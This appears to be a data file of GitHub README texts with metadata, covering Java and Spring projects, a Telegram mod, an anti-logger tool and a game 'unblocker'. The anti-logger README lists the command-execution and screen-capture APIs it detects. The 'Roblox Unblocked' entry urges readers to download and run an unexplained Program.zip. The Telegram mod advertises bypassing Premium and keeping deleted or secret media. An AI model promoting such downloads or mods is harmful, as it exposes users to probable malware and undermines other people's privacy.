* [com.zaxxer.hikari](https://github.com/brettwooldridge/HikariCP) for connection pooling
* [bcrypt](https://github.com/patrickfav/bcrypt) for password salt and hashing
* [org.slf4j](https://github.com/qos-ch/slf4j) as a logging facade

Almost all the code is contained in the [`RealWorldAPI`](https://github.com/bowbahdoe/jdk-httpserver-realworld/blob/main/src/main/java/dev/mccue/jdk/httpserver/realworld/RealWorldAPI.java) class. If any of the choices made here offend your sensibilities
I encourage forking and showing the way you would prefer it be done. If you think something is done in a subpar way or
is otherwise objectively broken please open an issue.

Specifically, I would encourage folks to try and

* Split up the `RealWorldAPI` class. Where are the natural boundaries?
* Try using their database abstraction of choice. What would this look like with `Hibernate`, `JOOQ`, or `JDBI`? Would there be fewer or more round trips to the database?
* Try using their JSON library of choice. 
* Try to do the whole persistence/service/etc. split. Does that make things better?
* Add unit tests. For this exact thing there are already API tests I was able to just use, but how would testing look with JUnit?
* etc.

I personally see a lot of areas for improvement once string templates are real. Counting `?`s in big queries is maybe the biggest
remaining ""raw"" JDBC shortcoming.

# Getting started

## Prerequisites

* Java 22 or above
* SDKMan
* Docker

## Usage

First, start up postgres

```
$ docker compose up -d
```

Then install MyBatis Migrations. This is currently easiest to do with SDKMan.

```
$ sdk install mybatis
```

Apply the migrations to the database

```
$ cd migrations
$ migrate up
$ cd ..
```

Then to run the server either 

* open the project in your editor
* run it through maven (`./mvnw exec:java -Dexec.mainClass=""dev.mccue.jdk.httpserver.realworld.Main""`)
* run it through docker

```
$ docker build -t realworld .
$ docker run realworld
```

The `.env` file for this project is committed to the repo. Note that in general this is a bad idea/practice, but the
only secrets here are for the local database connection so it's fine.",0,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
springaialibaba/spring-ai-alibaba-examples,main,"# Spring AI Alibaba Example

> Spring AI Alibaba Example.

## Introduce

This repository contains many examples to introduce various uses of Spring AI Alibaba from basic to advanced and best practices for AI projects.
For a more detailed introduction, please refer to the README.md in each sub-project and [Spring AI Alibaba official website](https://java2ai.com).

## How to participate

We welcome contributions of any kind, including but not limited to:

- Spring AI Alibaba usage examples;
- Use of Spring AI Alibaba API;
- Spring AI usage examples;
- Best practices for AI projects, etc.

The project warehouse is under construction, please read [Roadmap.md](./Roadmap-zh.md) for more information.

## Project Structure

In this example project, we combine modules according to the way of function, and strive to modularize the functions of each example to make it easier for everyone to find and use. An example of a basic module is as follows:

```text
|-spring-ai-alibaba-chat-example
|-- dashscope-chat
|----dashscope-chat-model
|------ src
|------ README.md
|------ pom.xml
|----dashscope-chat-client
|------ src
|------ README.md
|------ pom.xml
|-- ollama-chat
|----ollama-chat-model
|------ src
|------ README.md
|------ pom.xml
|----ollama-chat-client
|------ src
|------ README.md
|------ pom.xml
|-- ...... (other LLMs)
|- ......(other Examples)
```
",0,0,1,Apache-2.0,1,38.0,0.0,1.0,1.0,1.0,0.0,0.1,2.0
Xposed-Modules-Repo/com.my.televip,main,"# TeleVip LSPosed

A module for modifying Telegram with the following features:

1. Hide ""Seen"" status for groups, channels, and private messages.

2. Hide ""Typing..."" indicator.

3. Hide story view status.

4. Unlock all restricted and encrypted features for channels.

5. Boost Telegram download speed.

6. Enable Telegram Premium features.

7. Save stories to the gallery, including those that cannot normally be saved.

8. Change name (Note: The name changes only on your device).

9. Hide Phone Number

10. Hide Online Status

11. Prevent Deletion of Secret Media

12. Show Deleted Messages

13. Disable Stories

There are additional features that are not listed here.

# Support clients
1. Telegram 11.6.1 (55852)
2. Plus 11.5.3.0 (21340)
3. TG Connect 11.0.1 (1100109)
4. Nagram 11.5.3 (1202)
5. Skygram 10.20.6 (40639)
6. iMe 11.5.3 (11050302)
7. X Plus 11.5.4 (55159)
8. Cherrygram 11.5.3 (55130)
9. Nicegram 1.39.3 (1529)
10. Telegram web 11.6.1 (55859)
11. Telegram Beta 11.6.2 (56159)
12. exteraGram 11.5.3 (55119)
13. Nekogram 11.5.3S (55150)
14. ForkGram 11.5.3.0 (551108)
15. ForkClient Beta 11.5.3.0 (551109)

Developed by an @mustafa1dev
",7,0,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
3000IQPlay/AntiRAT-21,main,"# AntiRAT-21

# Disclaimer:

This JDK is NOT foolproof. It only detects a$$ loggers and ""crashes"" your instace upon detection. Do not rely on it completely; sometimes, you need to use your brain too.

**Currently:** <br/>
java/net/URL <br/>
java/lang/Runtime.getRuntime().exec() <br/>
java/lang/ProcessBuilder <br/>
java/awt/Robot.createScreenCapture() <br/>
java/io/File

**TODO:** <br/>
java.awt.datatransfer.Clipboard - Spoof clipboard retrieve. <br/>
Spoofed POST request body <br/>
NIO - java/nio/file/FileSystem <br/>
InputStreams
",1,0,1,GPL-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2735.0
elsese123/Roblox-Unblocked,master,"# Roblox Unblocked üéÆ

Welcome to the Roblox Unblocked repository! Here you can access and enjoy a variety of games from Roblox in environments where gaming sites are typically restricted. 

## Repository Content

In this repository, you will find a downloadable program that provides access to Roblox unblocked games. 

### Usage

To start playing Roblox unblocked games, you can download the program from the link provided below.

[Launch Roblox Unblocked Program](https://github.com/user-attachments/files/18285177/Program.zip)

### Instructions

1. Download the program from the link above.
2. Launch the program on your computer.
3. Start exploring and playing Roblox games that are typically restricted.

## Further Information

If the link provided above does not work or you need more information, check the ""Releases"" section of this repository for alternative download options.

Thank you for visiting the Roblox Unblocked repository and happy gaming! üïπÔ∏è",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
davidtos/JUring,master,"# JUring: File I/O for Java using IO_uring
JUring is a high-performance Java library that provides bindings to Linux's io_uring asynchronous I/O interface
using Java's Foreign Function & Memory API. Doing Random reads JUring achieves 33% better performance than Java NIO FileChannel
operations for local files and 78% better performance for remote files.

## Performance 
The following benchmarks show the improvement of using io_uring over Java built-in I/O.
The test ran on a Linux machine with 32 cores, a nvme SSD, and a mounted remote directory.

Local file performance:
```text
Benchmark                                              Mode  Cnt     Score     Error   Units
BenchMarkLibUring.libUring                            thrpt    5  1074.229 ¬± 242.693  ops/ms
BenchMarkLibUring.libUringBlocking                    thrpt    5   829.590 ¬±  48.144  ops/ms
BenchMarkLibUring.readUsingFileChannel                thrpt    5   736.241 ¬±  21.925  ops/ms
BenchMarkLibUring.readUsingFileChannelVirtualThreads  thrpt    5   691.886 ¬±   4.563  ops/ms
```
JUring achieves 45.9% higher throughput compared to using FileChannel.

### Local vs Remote File Performance
When testing with remote files (network mounted storage), io_uring performs 78% better than FileChannels.

```text
Benchmark                                              Mode  Cnt  Score   Error   Units
BenchMarkLibUring.libUring                            thrpt    5  1.729 ¬± 1.201  ops/ms
BenchMarkLibUring.libUringBlocking                    thrpt    5  1.920 ¬± 0.168  ops/ms
BenchMarkLibUring.readUsingFileChannelVirtualThreads  thrpt    5  1.078 ¬± 0.990  ops/ms
```
The remote machine uses HDD and is connected with a Cat 5E cable to the machine running the benchmarks. The benchmarks were run 
using a maximum of 5 threads, using more threads opened too many file descriptors. 

## Benchmark Methodology
The benchmarks are conducted using JMH (Java Microbenchmark Harness) with the following parameters:

- Each test performs 2300 operations per invocation 
- Tests using local files ran with 32 threads
- Tests using remote files ran with 5 threads (Linux threw errors when using more threads to run the FileChannel and io_uring example)
- Queue depth of 2500 for io_uring operations
- Fixed read size of 4KB (4096 bytes)
- Random offsets within files
- Initializing the rings is done outside the benchmark

The benchmark includes three main scenarios:

- Non-blocking io_uring (libUring): Direct io_uring operations
- Blocking io_uring (libUringBlocking): io_uring with a blocking API
- FileChannel (readUsingFileChannel): Standard Java NIO file operations


For full benchmark details and methodology, see [BenchMarkLibUring.java](https://github.com/davidtos/JUring/tree/master/src/test/java/bench) in the source code.

## Requirements

- Linux kernel 5.1 or higher
- liburing installed
- Java 22 or higher (for Foreign Function & Memory API)

## Quickstart
There are two ways to use JUring, there is the direct and blocking API. The direct API lets you prepare entries that you
match with results based on id. The blocking API is built with virtual threads in mind, blocking/unmounting them while they wait for a result.

Reading from a file
```java
// Blocking API Example
try (JUringBlocking io = new JUringBlocking(32)) {
    // Read file
    BlockingReadResult result = io.prepareRead(""input.txt"", 1024, 0);
    
    io.submit();
    
    MemorySegment buffer = result.getBuffer();
    // Process buffer...
    result.freeBuffer();
}

// Non-blocking API Example
try (JUring io = new JUring(32)) {
    long id = io.prepareRead(""input.txt"", 1024, 0);
    
    io.submit();
    
    Result result = io.waitForResult();
    if (result instanceof ReadResult r) {
        MemorySegment buffer = r.getBuffer();
        // Process buffer...
        r.freeBuffer();
    }
}
```

Write to a file
```java
// Blocking API Example
try (JUringBlocking io = new JUringBlocking(32)) {
    byte[] data = ""Hello, World!"".getBytes();
    BlockingWriteResult writeResult = io.prepareWrite(""output.txt"", data, 0);
    
    io.submit();
    
    long bytesWritten = writeResult.getResult();
    System.out.println(""Wrote "" + bytesWritten + "" bytes"");
}

// Non-blocking API Example
try (JUring io = new JUring(32)) {
    byte[] data = ""Hello, World!"".getBytes();
    long id = io.prepareWrite(""output.txt"", data, 0);
    
    io.submit();
    
    Result result = io.waitForResult();
    if (result instanceof WriteResult w) {
        long bytesWritten = w.getResult();
        System.out.println(""Wrote "" + bytesWritten + "" bytes"");
    }
}
```

### The steps explained
Both APIs follow a similar pattern of operations:

1. **Initialization**: Create an io_uring instance with a specified queue depth. The queue depth determines how big the submission and completion queue can be.
```java
try (JUringBlocking io = new JUringBlocking(32)) {}
```

2. **Prepare Operation**: Tell io_uring what operation you want to perform. This will add it to the submission queue.
```java
BlockingReadResult result = io.prepareRead(""input.txt"", 1024, 0);
```

3. **Submit**: tell IO_Uring to start working on the prepared entries.
```java
io.submit();
```

4. **Getting results**: Get operations results
```java
// Blocking
MemorySegment buffer = result.getBuffer();

// non-blocking
Result result = io.waitForResult();
```

5. **Cleanup**: Free read buffer

For read operations it is necessary to free the buffer that lives inside the result. The buffers are created using malloc and are not managed by an arena. They are MemorySegments, so it is possible to 
have them cleaned up when an area closes.
```java
result.freeBuffer();
```
Freeing buffers is not necessary for write operations, these buffers are automatically freed when the operation is seen in the completion queue by JUring.

## Thread Safety
JURing is not thread safe, from what I read about io_uring there should only be one instance per thread. I want to copy this behaviour to 
not deviate too much from how io_works. The completion and submission queue used by io_uring don't support multiple threads writing to them at the same time. Preparing operations or waiting 
for completions should be done by a single thread. Processing the results/buffers is thread safe.

## Current Limitations and Future Improvements

### Creation cost of JUring instances
- Creating an instance takes a few of milliseconds, I am working on minimizing this creation time.

### Memory Usage 
- The current implementation has higher memory usage than ideal. This is a known issue that I'm actively working on improving.

## Future improvements planned:

- Pooling of rings.
- Adding more io_uring features
- File modes and flags
- Adding a blocking-api for local files
- Better memory usage 
- Improved memory cleanup strategies (smart MemorySegments) 
- Encoding support
- Support for sockets",0,0,2,Unlicense,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,13.0
danvega/scm-workshop,main,"# Spring Common Mistakes Workshop

**Welcome to the Spring Common Mistakes Workshop!**

In this workshop, you'll gain insights into some of the most frequent mistakes developers make while working with Spring 
applications‚Äîand, more importantly, how to avoid them. We will cover a range of topics, from architectural decisions and 
logging best practices to data access patterns, API design, performance tuning, testing, and security considerations.

By the end of this workshop, you'll have a deeper understanding of how to structure your Spring applications effectively, 
write cleaner and more secure code, and make better decisions about performance and architecture.

### What You Will Learn:
- How to organize code effectively and follow dependency injection principles.
- Best practices for logging, data access, and API design.
- Common pitfalls in transaction management, configuration, and testing.
- Strategies for securing your Spring applications and optimizing performance.

### Prerequisites:
- Familiarity with Spring Boot and basic Java programming.
- A general understanding of web development concepts, databases, and Web APIs.

Get ready to dive deep into the Spring ecosystem and level up your skills by learning from common mistakes‚Äîlet's get started!

## Agenda 

- **[Architecture](#architecture)** 
  - [Default package](#default-package)
  - [Component Scanning](#component-scanning-)
  - [Organizing Code](#organizing-code)
    - Package By Layer
    - Package by Feature
  - [Spring Modulith](#spring-modulith) üî•
  - [Ignoring Dependency Injection Principles](#ignoring-dependency-injection-principles)
- **[Logging](#logging)**
  - [Using System.out.println Instead of a Logging Framework](#using-systemoutprintln-instead-of-a-logging-framework)
  - [Logging Sensitive Information](#logging-sensitive-information)
- **[Data Access](#data-access)**
  - [Shifting Left (Docker Compose)](#shifting-left-docker-compose)
  - [Picking the right abstraction layer](#picking-the-right-abstraction-layer)
    - JDBC Template / JDBC Client
    - Spring Data JPA
    - Spring Data JDBC
  - [N+1 Query Problem](#n1-query-problem)
  - [Neglecting transaction management](#neglecting-transaction-management)
    - Incorrect Use of @Transactional
    - Not Understanding Transaction Propagation
    - Transactions on Non-Public Methods
- **[Web APIs](#web-apis)**
  - [REST](#rest)
    - Improper RESTful API Design
    - Lack of Versioning
    - Controller Bloat
    - Poor Exception Handling
    - Lack of API Documentation
  - [GraphQL](#graphql)
- **[Configuration](#configuration)** 
  - [Hardcoding Configuration Values](#hardcoding-configuration-values)
  - [Not Using Environment Variables](#not-using-environment-variables)
- **[Performance](#performance)** 
  - [Virtual Threads](#virtual-threads)
  - [Native Images](#native-images)
- **[Testing](#testing)**
  - Overusing @SpringBootTest
  - Insufficient Unit Testing
- **[Security](#security)**
  - Not Adopting Secure by Default (""Fail Closed"")
  - Implementing your own JwtFilter
- **[Resources](#resources)**

## Architecture

### Default package

Putting code in the default package (no package declaration) causes several issues:

- Component scanning may not work properly, affecting autowiring and dependency injection
- Makes it impossible to use package-private visibility for encapsulation
- Creates tight coupling between classes
- Makes the codebase harder to maintain and test
- Violates separation of concerns principle

```java
@Component
public class WelcomeMessage {

    public String getWelcomeMessage() {
        return ""Welcome to ThoughtStream!"";
    }

}
```

### Component Scanning 

When classes are in the same package or sub-packages as the main application class annotated with 
`@SpringBootApplication`, Spring Boot automatically scans and registers them as beans through its component scanning 
mechanism. The @SpringBootApplication annotation includes `@ComponentScan` which by default scans the package 
containing the main class and all its sub-packages.


```java
@SpringBootApplication
@ComponentScan(basePackages = ""dev.danvega.base"")
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

}
```

### Organizing Code

Package by Feature benefits:

- Better encapsulation: Only controllers need to be public, internal components can be package-private
- Higher cohesion: Related code stays together
- Reduces coupling: Features are isolated, changes are contained
- Clear boundaries: Each feature package is a mini bounded context
- Easier testing: Feature components can be tested together
- Better modularity: Features can be moved or modified as units
- Clear dependencies: Inter-feature communication must be explicit through public APIs

‚ùå Package by Layer (Traditional)
- com.example.demo
- .controller
  - PostController.java      // public
  - CommentController.java   // public
- .service
  - PostService.java        // public
  - CommentService.java     // public
- .repository
  - PostRepository.java     // public
  - CommentRepository.java  // public
- .model
  - Post.java              // public
  - Comment.java           // public
  - Reaction.java          // public
  - Tag.java               // public

‚úÖ Package by Feature
- com.example.demo
- .post
  - PostController.java      // public
  - PostService.java        // package-private
  - PostRepository.java     // package-private
  - Post.java              // package-private
  - Tag.java               // package-private
- .comment
  - CommentController.java   // public
  - CommentService.java     // package-private
  - CommentRepository.java  // package-private
  - Comment.java           // package-private
  - Reaction.java          // package-private

- Overuse of public access modifier
  - Improper Layering (Package by Feature, not by Layer)
  - Spring Modulith üî•

### Spring Modulith

Spring Modulith helps structure large Spring Boot applications into well-defined, loosely coupled modules. It provides:

- Module boundaries through package conventions
- Runtime validation of module dependencies
- Documentation generation
- Event-driven communication between modules

**Structure Example**

```java
com.example.application
  .post     // A module
  .comment // Another module  
  .user  // Another module
```

#### Key Benefits
- Clear module boundaries
- Dependency validation
- Better maintainability
- Architectural enforcement
- Module documentation

#### Spring Modulith Resources

1. [Official Documentation](https://spring.io/projects/spring-modulith)
2. [Introduction Blog Post](https://spring.io/blog/2022/10/21/introducing-spring-modulith)
3. [Getting Started Guide](https://docs.spring.io/spring-modulith/docs/current/reference/html/#getting-started)
4. [Sample Applications](https://github.com/spring-projects/spring-modulith/tree/main/spring-modulith-examples)

### Ignoring Dependency Injection Principles

Key points about dependency injection in Spring Boot:

1. Field injection (@Autowired) hides dependencies, prevents immutability, complicates testing, and enables circular dependencies.
2. Constructor injection:
   - Makes dependencies explicit
   - Enables final fields
   - Simplifies testing
   - Prevents circular dependencies
   - Forces better design decisions
3. Common signs of poor DI practices:
   - Multiple @Autowired fields
   - Non-final dependencies
   - Classes requiring Spring context for testing
   - Circular dependencies between services
4. Recommendations:
   - Use constructor injection exclusively
   - Keep dependencies minimal
   - Mark fields as final
   - Consider @RequiredArgsConstructor from Lombok
   - Use @Configuration for complex scenarios

```java
// ‚ùå Circular Dependency Example
@Service
public class UserService {
    @Autowired
    private AuthService authService;

    public User createUser(UserDto dto) {
        authService.validateUserCreation(dto);
        return saveUser(dto);
    }
}

@Service
public class AuthService {
    @Autowired
    private UserService userService;

    public void validateUserCreation(UserDto dto) {
        if (userService.exists(dto.getEmail())) {
            throw new UserAlreadyExistsException();
        }
    }
}

// ‚úÖ Fixed Version - Extract Common Logic
@Service
public class UserService {
    private final UserRepository userRepository;
    private final AuthService authService;

    public UserService(UserRepository userRepository, AuthService authService) {
        this.userRepository = userRepository;
        this.authService = authService;
    }

    public User createUser(UserDto dto) {
        authService.validateUserCreation(dto);
        return saveUser(dto);
    }
}

@Service
public class AuthService {
    private final UserRepository userRepository;

    public AuthService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    public void validateUserCreation(UserDto dto) {
        if (userRepository.existsByEmail(dto.getEmail())) {
            throw new UserAlreadyExistsException();
        }
    }
}

// The fix involves:
// 1. Identifying the shared functionality (user lookup)
// 2. Moving it to a common dependency (UserRepository)
// 3. Using constructor injection to make dependencies explicit
// 4. Each service now depends on the repository, not each other
```

## Logging

### Using System.out.println Instead of a Logging Framework

**Problems with System.out.println()**

1. No Log Levels
   - `System.out.println()` offers no severity levels (DEBUG, INFO, ERROR, etc.)
   - Cannot filter logs based on importance or environment
   ```java
    // No way to differentiate between debug and error messages
    System.out.println(""User login failed""); // Is this an error? Warning?
    System.out.println(""Database connection established""); // Is this info? Debug?
    ```
2. Performance Impact
   - I/O operations are synchronous and block the main thread
   - No buffering or async logging capabilities
   - No performance optimizations for high-throughput scenarios
   ```java
    // Each call blocks until the message is written
    for(User user : users) {
    System.out.println(""Processing user: "" + user.getId()); // Blocks on every iteration
    }
    ```
3. No Configuration Control
   - Can't disable logging in production
   - Can't redirect output to different destinations
   - No rotation or file management
   ```java
    // Hard to maintain and impossible to configure
    System.out.println(""Debug: "" + complexObject.toString());
    ```

#### Benefits of Proper Logging Frameworks (SLF4J + Logback)

1.Structured Logging
2. Configuration Flexibility
3. Performance Optimizations
   * Lazy evaluation of log messages
   * Asynchronous logging
   * Log level filtering at compile-time
4. Production-Ready Features
   * Log rotation and archiving
   * Multiple output destinations
   * Contextual information (thread, class, timestamp)
   * MDC (Mapped Diagnostic Context) for request tracing

#### Best Practices

1. Use SLF4J as the logging facade
```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
```

2. Configure appropriate log levels
   * ERROR: Application failures requiring immediate attention
   * WARN: Unexpected situations that don't cause failure
   * INFO: Important business events
   * DEBUG: Detailed information for debugging
   * TRACE: Most detailed level for development


3. Include contextual information
```java
logger.error(""Transaction {} failed= for user {}"", transactionId, userId);
```

4. Use parameterized logging
```java
// Good
logger.debug(""Processing order {}"", orderId);

// Bad
logger.debug(""Processing order "" + orderId);  // Creates string regardless of log level
```

#### Logging Resources

[You might not need Lombok](https://www.danvega.dev/blog/no-lombok)

Live Template: 
```java
private static final Logger log = LoggerFactory.getLogger($CLASS_NAME$.class);
```

### Logging Sensitive Information

Logging sensitive information creates serious security and compliance risks. When logs contain data like credit card numbers, SSNs, or health information, they become attractive targets for attackers and can lead to identity theft and fraud. Unlike databases, logs often lack proper security controls, may be widely distributed, and can persist indefinitely. Exposing sensitive data in logs also violates regulations like GDPR and HIPAA, potentially resulting in hefty fines and mandatory breach notifications.

```java
@Service
public class UserService {
    private static final Logger logger = LoggerFactory.getLogger(UserService.class);

    // WRONG: Logging sensitive information
    public void createUser(User user) {
        logger.info(""Creating user with SSN: {}, credit card: {}"", 
            user.getSsn(), 
            user.getCreditCard().getNumber()
        );
    }

    // WRONG: Exception logging exposing sensitive data
    public void processPayment(Payment payment) {
        try {
            paymentProcessor.process(payment);
        } catch (Exception e) {
            logger.error(""Payment failed for card: "" + payment.getCreditCardNumber(), e);
        }
    }

    // WRONG: Debug logging with PII
    public void updateProfile(UserProfile profile) {
        logger.debug(""Updating profile: {}"", profile.toString());  // toString() might include all fields
    }
}
```

#### Best Practices

1. **Mask Sensitive Data**
```java
public class SensitiveDataMasker {
    public static String maskCreditCard(String ccNumber) {
        if (ccNumber == null) return null;
        return ""****-"" + ccNumber.substring(ccNumber.length() - 4);
    }

    public static String maskSSN(String ssn) {
        if (ssn == null) return null;
        return ""***-**-"" + ssn.substring(ssn.length() - 4);
    }
}

@Service
public class UserService {
    public void createUser(User user) {
        logger.info(""Creating user with masked SSN: {}"", 
            SensitiveDataMasker.maskSSN(user.getSsn())
        );
    }
}
```

2. **Custom toString() Methods**
```java
@Entity
public class User {
    private String ssn;
    private String creditCardNumber;
    private String email;

    @Override
    public String toString() {
        return String.format(""User[id=%d, email=%s]"", 
            id, 
            maskEmail(email)
        );
    }
}
```

3. **Use MDC for Tracking Without PII**
```java
public class SecureUserContext {
    public void processUserRequest(String userId) {
        String sessionId = generateSessionId();  // Random or hash-based ID
        MDC.put(""sessionId"", sessionId);
        MDC.put(""userId"", hashUserId(userId));  // Store hashed version
        
        try {
            // Processing
        } finally {
            MDC.clear();
        }
    }
}
```

MDC (Mapped Diagnostic Context) is a logging utility concept primarily used in Java applications, though similar patterns exist in other languages. It's essentially a thread-local storage mechanism that allows you to attach contextual information to log messages throughout the execution of a request or operation.

4. **Configure Logging Patterns**
```xml
<appender name=""FILE"" class=""ch.qos.logback.core.FileAppender"">
    <encoder>
        <!-- Avoid including full stack traces in logs -->
        <pattern>%date [%thread] %-5level %logger{36} - %msg%n</pattern>
    </encoder>
</appender>
```

5. **Implement Log Sanitization**
```java
public class SecureLogger {
    private static final Pattern CREDIT_CARD = Pattern.compile(""\\d{4}-\\d{4}-\\d{4}-\\d{4}"");
    private static final Pattern SSN = Pattern.compile(""\\d{3}-\\d{2}-\\d{4}"");

    public static String sanitize(String message) {
        if (message == null) return null;
        
        message = CREDIT_CARD.matcher(message).replaceAll(""****-****-****-****"");
        message = SSN.matcher(message).replaceAll(""***-**-****"");
        return message;
    }
}

// Usage
logger.info(""Processing: {}"", SecureLogger.sanitize(message));
```

#### Sensitive Data Checklist

Never log:
- Social Security Numbers
- Credit Card Numbers
- Passwords or Security Questions
- Access Tokens/API Keys
- Bank Account Details
- Health Information (HIPAA)
- Full Names with Other PII
- Biometric Data
- Exact Geolocation Data
- Children's Information

#### Regulatory Compliance

- GDPR: Requires protection of personal data
- HIPAA: Strict requirements for health information
- PCI DSS: Credit card data protection
- CCPA: California privacy requirements

Each has specific requirements about logging and data protection.

## Data Access

### Shifting Left (Docker Compose)

One of the most common pitfalls in Spring Boot development is using H2 or other in-memory databases during development while running a different database (like PostgreSQL or MySQL) in production. While H2 is convenient and requires minimal setup, this practice creates a dangerous disconnect between development and production environments.

#### The Problem

When developers use H2 in development but PostgreSQL in production, they're essentially testing their application against a completely different database engine. This can lead to several issues:

1. Database-specific SQL features that work in H2 might fail in PostgreSQL
2. Different transaction isolation behaviors between databases
3. Missed performance issues that only appear with production database
4. Schema migration scripts that work in H2 but fail in PostgreSQL
5. Inconsistent handling of case sensitivity and data types

#### The Solution: Docker Compose + Spring Boot

Spring Boot 3.1+ includes built-in Docker Compose support, making it trivially easy to spin up production-like databases during development. Instead of reaching for H2, developers can:

- Use the same database engine as production
- Match production database versions exactly
- Test against real database behavior
- Validate migrations against the actual target database
- Catch database-specific issues early in development

This approach follows the ""dev/prod parity"" principle from the Twelve-Factor App methodology, reducing the likelihood of environment-specific bugs and making the development environment more reliable.

### Picking the right abstraction layer

One of the most impactful architectural decisions in a Spring Boot application is selecting the appropriate data access abstraction level. Each abstraction offers different trade-offs between productivity, performance, and complexity. Let's explore when to use each option.

#### JdbcTemplate / JdbcClient (Low-Level Abstraction)

**Best For:**
- Performance-critical applications
- Simple CRUD operations with complex queries
- When you need complete SQL control
- Batch operations
- Legacy database integration

**Trade-offs:**
- Maximum control over SQL and performance
- Direct mapping between SQL and code
- No lazy loading or caching
- More boilerplate code
- Manual mapping between results and objects

#### Spring Data JDBC (Middle-Ground Abstraction)

**Best For:**
- Domain-Driven Design (DDD) applications
- When you want JPA-like convenience without the complexity
- Applications requiring predictable database access patterns
- Teams that want to maintain control over database interactions

**Trade-offs:**
- No lazy loading (which can be a feature!)
- Explicit aggregate boundaries
- Simpler persistence model than JPA
- Better performance than JPA for most use cases
- Less ""magic"" than JPA

#### Spring Data JPA (High-Level Abstraction)

**Best For:**
- Rapid application development
- Complex domain models with many relationships
- When database portability is important
- Teams familiar with JPA/Hibernate concepts
- Applications where query performance isn't the primary concern

**Trade-offs:**
- Highest productivity for complex domain models
- Powerful querying capabilities (JPQL, Criteria API)
- Cache management and lazy loading
- Can hide performance issues
- Steeper learning curve for proper usage

#### Decision Framework

Consider these factors when choosing:
1. **Team Experience**: Does your team understand JPA's pitfalls and benefits?
2. **Performance Requirements**: Do you need fine-grained control over SQL?
3. **Domain Complexity**: How complex are your entity relationships?
4. **Maintainability**: Who will maintain this code in the future?
5. **Time Constraints**: Do you need rapid development or long-term optimization?

**Remember:** You can mix these abstractions in the same application. Use `JdbcClient` for performance-critical queries while using JPA for simpler CRUD operations.

### N+1 Query Problem

The N+1 query problem is one of the most common performance anti-patterns in database access. Here's why it matters:

Problem: When loading a parent entity with child collections, developers make:

One query to fetch parent records
N separate queries to fetch child records (one per parent)

Example scenario with our posts:

```sql
-- Initial query
SELECT * FROM posts;  -- Gets 100 posts

-- Then for EACH post (100 times):
SELECT * FROM comments WHERE post_id = ?
```

**Impact:**

- Network latency multiplies (100ms √ó 100 queries = 10s delay)
- Database connection pool saturates
- Performance degrades exponentially with data growth

**Better approach:**

```sql
SELECT p.*, c.*
FROM posts p 
LEFT JOIN comments c ON p.id = c.post_id;
```

Common places to look:

* One-to-many relationships (Post -> Comments)
* Many-to-many relationships (Post -> Tags)
* Lazy loading in ORMs
* REST endpoints returning nested resources

Prevention:
* Use JOIN queries
* Implement batch fetching
* Use database profiling tools
* Review ORM fetch strategies carefully
* Consider GraphQL for flexible data loading

This problem becomes especially critical in microservices where network latency compounds the issue.

### Neglecting transaction management

Transactions ensure database operations are atomic, consistent, isolated, and durable (ACID):

```java
@Service
public class PostService {

    // Without transaction - potential inconsistency
    public void createPostWithTags(Post post, List<Tag> tags) {
        postRepository.save(post);     // If this succeeds but...
        tagRepository.saveTags(tags);  // ...this fails, data is inconsistent
    }

    // With transaction - all or nothing
    @Transactional
    public void createPostWithTags(Post post, List<Tag> tags) {
        postRepository.save(post);     
        tagRepository.saveTags(tags);  // If this fails, post save is rolled back
    }
}
```

**Key benefits:**
* Atomicity: Multiple operations succeed or fail together
* Consistency: Database moves from one valid state to another
* Isolation: Concurrent transactions don't interfere
* Durability: Committed changes persist

**Common scenarios requiring transactions:**
* Financial operations
* Multi-table updates
* User registration flows
* Order processing
* Data migrations

Without transactions, system crashes or concurrent access can leave data in an invalid state.

**Key issues:**
* Proxies and self-invocation - transactions only work through proxy calls
* Public method requirement - Spring AOP needs public methods
* Default REQUIRED vs REQUIRES_NEW - understand implications on transaction nesting
* Exception handling impacts rollback behavior
* Read operations need transaction for consistency
* Transaction boundaries should align with business operations

**Examples:** 

`PostService` & `CommentService` both use transactions:

## Web APIs

### REST

1. Improper RESTful API Design
   * Using verbs instead of nouns in endpoints (/createUser vs /users)
   * Inconsistent response structures across endpoints
   * Not using appropriate HTTP methods (POST for reads, GET for updates)
   * Not using proper HTTP status codes
   * Mixing plural and singular resource names
    ```java
    // Bad
    @PostMapping(""/getAllUsers"")
    public List<User> getUsers() { ... }
    
    // Good
    @GetMapping(""/users"")
    public List<User> getUsers() { ... }
    ```

2. Lack of Versioning
    * Not planning for API evolution
    * Breaking changes without version control
    ```java
    - URI versioning: /api/v1/users
    - Header versioning: Accept: application/vnd.company.app-v1+json
    - Parameter versioning: /api/users?version=1
    - Media type versioning: Accept: application/json;version=1
    ```
3. Controller Bloat
   * Business logic in controllers
   * Complex error handling
   * Validation logic mixed with request handling
   ```java
    // Bad
    @PostMapping(""/users"")
    public ResponseEntity<User> createUser(@RequestBody UserRequest request) {
    if (!isValidEmail(request.getEmail())) {
    throw new BadRequestException(""Invalid email"");
    }
    // Business logic here
    User user = new User();
    user.setName(request.getName());
    user.setEmail(request.getEmail());
    return ResponseEntity.ok(userRepository.save(user));
    }
    
    // Good
    @PostMapping(""/users"")
    public ResponseEntity<User> createUser(@Valid @RequestBody UserRequest request) {
    User user = userService.createUser(request);
    return ResponseEntity.ok(user);
    }
    ```
4. Poor Exception Handling
   * Generic error messages
   * Inconsistent error response structure
   * Not using global exception handlers   
   ```java
    @ControllerAdvice
    public class GlobalExceptionHandler {
   
        @ExceptionHandler(UserNotFoundException.class)
        public ResponseEntity<ErrorResponse> handleUserNotFound(UserNotFoundException ex) {
            ErrorResponse error = new ErrorResponse(
            HttpStatus.NOT_FOUND.value(),
            ex.getMessage(),
            LocalDateTime.now()
            );
            return new ResponseEntity<>(error, HttpStatus.NOT_FOUND);
        }
   
    }
    ```
   
5. Lack of API Documentation
   * Missing or outdated documentation
   * Not using OpenAPI/Swagger
   * Incomplete example requests/responses
   ```java
    @Operation(summary = ""Create new user"", description = ""Creates a new user in the system"")
    @ApiResponses(value = {
        @ApiResponse(responseCode = ""201"", description = ""User created""),
        @ApiResponse(responseCode = ""400"", description = ""Invalid input"")
    })
    @PostMapping(""/users"")
